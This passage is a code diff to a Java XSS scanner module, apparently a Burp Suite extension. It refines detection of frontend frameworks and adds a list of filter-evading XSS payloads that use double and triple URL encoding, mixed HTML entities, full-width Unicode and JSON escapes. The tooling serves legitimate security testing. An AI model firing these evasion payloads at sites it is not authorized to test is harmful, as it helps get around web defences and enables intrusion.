+                                    + ". Context: " + context + ".")
+                            .requestResponse(result)
+                            .payload(payload)
+                            .responseEvidence(checkFor)
+                            .build());
+                    return;
+                }
+                perHostDelay();
+            }
+        }
+
         // First: try static evasion payloads, skipping those using blocked chars
         for (String[] evasion : EVASION_PAYLOADS) {
             String payload = evasion[0];
@@ -2223,6 +2783,9 @@ public class XssScanner implements ScanModule {
 
     /**
      * Detects frontend frameworks present in the response body/headers. Cached per host.
+     * Uses a multi-signal approach: structural HTML markers (most reliable), script includes,
+     * and header indicators. Requires at least 2 signals per framework to confirm detection,
+     * reducing false positives from string matching in comments/text content.
      */
     private Set<String> detectFrameworks(HttpRequestResponse response) {
         String host = extractHost(response.request().url());
@@ -2250,40 +2813,107 @@ public class XssScanner implements ScanModule {
             }
             allHeaders = hb.toString();
         }
+
+        // Separate HTML structure from script content for targeted matching
+        // Structural markers (in HTML attributes/tags) are stronger signals than text content
+        String htmlStructure = body.replaceAll("<script[^>]*>[\\s\\S]*?</script>", ""); // HTML without scripts
         String combined = body + "\n" + allHeaders;
 
-        // AngularJS (1.x) — must check BEFORE Angular (2+) since Angular also uses 'ng-'
-        boolean hasAngularModern = containsAny(combined, "ng-version=", "_nghost-", "_ngcontent-",
-                "@angular/core", "ng-star-inserted");
-        boolean hasAngularJS = containsAny(combined, "ng-app", "ng-controller", "angular.module",
-                "angular.min.js", "$scope");
+        // AngularJS (1.x) — use structural HTML attribute markers first
+        // Require at least 2 signals to confirm: one structural + one script/lib indicator
+        int angularJSSignals = 0;
+        // Strong structural signals (attributes in HTML)
+        if (htmlStructure.contains("ng-app")) angularJSSignals += 2;           // Definitive: ng-app is AngularJS bootstrap
+        if (htmlStructure.contains("ng-controller")) angularJSSignals++;
+        if (htmlStructure.contains("ng-model")) angularJSSignals++;
+        if (htmlStructure.contains("ng-repeat")) angularJSSignals++;
+        if (htmlStructure.contains("ng-click")) angularJSSignals++;
+        // Script/lib indicators
+        if (combined.contains("angular.module")) angularJSSignals += 2;
+        if (combined.contains("angular.min.js")) angularJSSignals += 2;
+        if (combined.contains("angular.js")) angularJSSignals += 2;
+        if (combined.contains("$scope")) angularJSSignals++;
 
-        if (hasAngularJS && !hasAngularModern) {
+        // Angular (2+) — structural signals are very distinct
+        int angularModernSignals = 0;
+        if (htmlStructure.contains("ng-version=")) angularModernSignals += 2;    // Definitive
+        if (htmlStructure.contains("_nghost-")) angularModernSignals += 2;       // Angular component host marker
+        if (htmlStructure.contains("_ngcontent-")) angularModernSignals += 2;    // Angular content marker
+        if (htmlStructure.contains("ng-star-inserted")) angularModernSignals++;  // *ngIf/*ngFor marker
+        if (combined.contains("@angular/core")) angularModernSignals += 2;
+        if (combined.contains("zone.js")) angularModernSignals++;
+        if (combined.contains("platformBrowserDynamic")) angularModernSignals++;
+
+        boolean isAngularModern = angularModernSignals >= 2;
+        boolean isAngularJS = angularJSSignals >= 2 && !isAngularModern;
+
+        if (isAngularJS) {
             frameworks.add("ANGULARJS");
         }
-        if (hasAngularModern) {
+        if (isAngularModern) {
             frameworks.add("ANGULAR");
         }
 
-        // Vue.js
-        if (containsAny(combined, "v-cloak", "data-v-", "Vue.createApp", "vue.min.js",
-                "v-bind:", "v-on:", "v-model")) {
+        // Vue.js — structural signals
+        int vueSignals = 0;
+        if (htmlStructure.contains("v-cloak")) vueSignals += 2;                 // Definitive: Vue cloak directive
+        if (htmlStructure.contains("data-v-")) vueSignals += 2;                 // Definitive: Vue scoped CSS
+        if (htmlStructure.contains("v-bind:")) vueSignals++;
+        if (htmlStructure.contains("v-on:")) vueSignals++;
+        if (htmlStructure.contains("v-model")) vueSignals++;
+        if (htmlStructure.contains("v-if")) vueSignals++;
+        if (htmlStructure.contains("v-for")) vueSignals++;
+        if (combined.contains("Vue.createApp")) vueSignals += 2;
+        if (combined.contains("vue.min.js")) vueSignals += 2;
+        if (combined.contains("vue.global.js")) vueSignals += 2;
+        if (combined.contains("vue.esm")) vueSignals++;
+        if (combined.contains("__vue__")) vueSignals++;
+
+        if (vueSignals >= 2) {
             frameworks.add("VUE");
         }
 
-        // React / Next.js
-        if (containsAny(combined, "data-reactroot", "__NEXT_DATA__", "_reactRootContainer",
-                "react.production.min.js", "ReactDOM.render")) {
+        // React / Next.js — structural signals
+        int reactSignals = 0;
+        if (htmlStructure.contains("data-reactroot")) reactSignals += 2;        // Definitive: React root marker
+        if (htmlStructure.contains("data-reactid")) reactSignals += 2;          // Older React
+        if (combined.contains("__NEXT_DATA__")) reactSignals += 2;              // Definitive: Next.js data
+        if (combined.contains("_reactRootContainer")) reactSignals += 2;
+        if (combined.contains("react.production.min.js")) reactSignals += 2;
+        if (combined.contains("react-dom.production")) reactSignals += 2;
+        if (combined.contains("ReactDOM.render")) reactSignals++;
+        if (combined.contains("ReactDOM.createRoot")) reactSignals++;
+        if (combined.contains("__NEXT_LOADED_PAGES__")) reactSignals++;
+        if (combined.contains("_next/static")) reactSignals++;
+
+        if (reactSignals >= 2) {
             frameworks.add("REACT");
         }
 
-        // jQuery
-        if (containsAny(combined, "jQuery", "jquery.min.js", "$.fn.", "$(document).ready")) {
+        // jQuery — require script/library marker, not just text "$"
+        int jquerySignals = 0;
+        if (combined.contains("jquery.min.js")) jquerySignals += 2;             // Definitive: jQuery script include
+        if (combined.contains("jquery.js")) jquerySignals += 2;
+        if (combined.contains("jquery-")) jquerySignals += 2;                   // CDN pattern: jquery-3.6.0.min.js
+        if (combined.contains("jQuery.fn.")) jquerySignals += 2;
+        if (combined.contains("$.fn.")) jquerySignals++;
+        if (combined.contains("$(document).ready")) jquerySignals++;
+        if (combined.contains("jQuery(")) jquerySignals++;
+        // Version detection for targeted CVE payloads
+        Pattern jqVersion = Pattern.compile("jQuery\\s+v?([\\d.]+)");
+        Matcher jqvm = jqVersion.matcher(combined);
+        if (jqvm.find()) {
+            jquerySignals += 2;
+        }
+
+        if (jquerySignals >= 2) {
             frameworks.add("JQUERY");
         }
 
         frameworkCachePerHost.put(host, frameworks);
-        api.logging().logToOutput("[XSS] Framework detection for host " + host + ": " + frameworks);
+        api.logging().logToOutput("[XSS] Framework detection for host " + host + ": " + frameworks
+                + " (signals: AngularJS=" + angularJSSignals + ", Angular=" + angularModernSignals
+                + ", Vue=" + vueSignals + ", React=" + reactSignals + ", jQuery=" + jquerySignals + ")");
         return frameworks;
     }
 
@@ -2502,6 +3132,21 @@ public class XssScanner implements ScanModule {
                 {"\u001b(J<script>alert(1)</script>", "<script>alert(1)</script>", "ISO-2022-JP escape"},
                 // Overlong UTF-8 (some decoders accept)
                 {"\u00c0\u00bcscript\u00c0\u00bealert(1)\u00c0\u00bc/script\u00c0\u00be", "alert(1)", "Overlong UTF-8"},
+                // Multi-layer encoding chains — double/triple URL encoding
+                {"%253Cscript%253Ealert(1)%253C%252Fscript%253E", "alert(1)", "Double URL-encoded script tag"},
+                {"%25253Cscript%25253Ealert(1)%25253C/script%25253E", "alert(1)", "Triple URL-encoded script tag"},
+                {"%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E", "onerror=alert", "Double URL-encoded img tag"},
+                // Mixed encoding: HTML entities inside URL-encoded wrapper
+                {"%26lt%3Bscript%26gt%3Balert(1)%26lt%3B%2Fscript%26gt%3B", "alert(1)", "HTML-in-URL mixed encoding"},
+                {"%26%2360%3Bscript%26%2362%3Balert(1)%26%2360%3B/script%26%2362%3B", "alert(1)", "Numeric HTML entities in URL encoding"},
+                // Unicode full-width characters (bypasses ASCII-only filters)
+                {"\uff1cscript\uff1ealert(1)\uff1c/script\uff1e", "alert(1)", "Full-width Unicode angle brackets"},
+                {"\uff1cimg src\uff1dx onerror\uff1dalert(1)\uff1e", "onerror=alert", "Full-width Unicode img tag"},
+                // Hex HTML entity encoding + URL encoding mix
+                {"&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;", "alert(1)", "Hex HTML entity script tag"},
+                {"%26%23x3C%3Bscript%26%23x3E%3Balert(1)%26%23x3C%3B%2Fscript%26%23x3E%3B", "alert(1)", "URL-encoded hex HTML entities"},
+                // Backslash-u JSON Unicode escape (servers that JSON-decode params)
+                {"\\u003cscript\\u003ealert(1)\\u003c\\u002fscript\\u003e", "alert(1)", "JSON Unicode escape sequences"},
         };
 
         for (String[] entry : encodingPayloads) {
@@ -3044,6 +3689,7 @@ public class XssScanner implements ScanModule {
     @Override
     public void destroy() {
         frameworkCachePerHost.clear();
+        wafCachePerHost.clear();
     }
 
     private enum XssTargetType { QUERY, BODY, COOKIE, JSON, HEADER, PATH }
@@ -3105,7 +3751,23 @@ public class XssScanner implements ScanModule {
         }
 
         String ctLower = contentType.split(";")[0].trim(); // Strip charset param
-        boolean isNonHtml = ctLower.startsWith("application/json")
+
+        // XHTML and multipart content types that DO execute inline scripts
+        // application/xhtml+xml is parsed as XML by browsers and executes <script> tags
+        // multipart/mixed can contain HTML parts that browsers render
+        boolean isExecutableNonHtml = ctLower.equals("application/xhtml+xml")
+                || ctLower.equals("multipart/mixed");
+
+        // text/xml and application/xml execute scripts IF they contain XHTML namespace
+        if ((ctLower.equals("text/xml") || ctLower.equals("application/xml")) && body != null) {
+            if (body.contains("xmlns=\"http://www.w3.org/1999/xhtml\"")
+                    || body.contains("xmlns='http://www.w3.org/1999/xhtml'")) {
+                isExecutableNonHtml = true;
+            }
+        }
+
+        boolean isNonHtml = !isExecutableNonHtml && (
+                ctLower.startsWith("application/json")
                 || ctLower.startsWith("text/plain")
                 || ctLower.startsWith("application/xml")
                 || ctLower.startsWith("text/xml")
@@ -3113,7 +3775,7 @@ public class XssScanner implements ScanModule {
                 || ctLower.startsWith("application/javascript")
                 || ctLower.startsWith("text/javascript")
                 || ctLower.startsWith("image/")
-                || ctLower.startsWith("application/octet-stream");
+                || ctLower.startsWith("application/octet-stream"));
 
         if (isNonHtml) {
             if (hasNosniff) {
